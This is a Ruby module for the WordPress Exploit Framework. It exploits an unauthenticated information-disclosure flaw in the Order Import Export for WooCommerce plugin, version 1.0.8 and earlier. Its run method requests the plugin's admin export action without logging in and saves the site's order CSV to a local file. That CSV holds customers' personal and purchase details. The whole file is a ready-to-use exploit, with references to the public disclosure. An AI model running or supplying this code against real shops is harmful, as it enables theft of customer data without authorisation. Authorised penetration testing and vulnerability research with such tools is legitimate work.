# frozen_string_literal: true

class Wpxf::Auxiliary::WoocommerceOrderImportExportOrderDisclosure < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Order Import Export for WooCommerce <= 1.0.8 Order Information Disclosure',
      desc: 'Version <= 1.0.8 of the import export plugin for WooCommerce allows unauthenticated '\
            'users to download a CSV disclosing information about orders placed in the system.',
      author: [
        'David Peltier', # Disclosure
        'rastating'      # WPXF module
      ],
      references: [
        ['WPVDB', '8624'],
        ['EDB', '40391']
      ],
      date: 'Sep 19 2016'
    )

    register_options([
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the export to',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('order-import-export-for-woocommerce', '1.0.9')
  end

  def export_path
    return nil if normalized_option_value('export_path').nil?
    File.expand_path normalized_option_value('export_path')
  end

  def export_url
    normalize_uri(wordpress_url_admin, 'admin.php')
  end

  def run
    return false unless super

    emit_info 'Downloading order export CSV...'
    res = download_file(
      url: export_url,
      method: :get,
      params: {
        'page' => 'wf_woocommerce_order_im_ex',
        'action' => 'export'
      },
      local_filename: export_path
    )

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    emit_success "Saved export to #{export_path}"
    true
  end
end
